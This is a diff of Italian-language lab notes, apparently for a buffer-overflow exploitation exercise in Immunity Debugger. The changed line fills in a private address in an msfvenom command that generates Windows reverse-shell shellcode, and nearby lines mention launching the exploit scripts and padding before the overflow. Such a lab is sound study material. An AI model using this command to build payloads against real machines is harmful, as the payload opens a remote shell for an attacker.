@@ -72,7 +72,7 @@ Cliccare sulla freccia blu in alto su Immunity e scrivere l'indirizzo di prima p
 
 Lanciare script5 e far vedere che abbiamo preso il breakpoint
 
-Generare shellcode con (msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.X LPORT 4444 EXITFUNC=thread -f c -a x86 -b "\x00")
+Generare shellcode con (msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.188 LPORT 4444 EXITFUNC=thread -f c -a x86 -b "\x00")
 
 Aprire script6 con shellcode appena generato e spiegare il "padding" prima dell'overflow
 
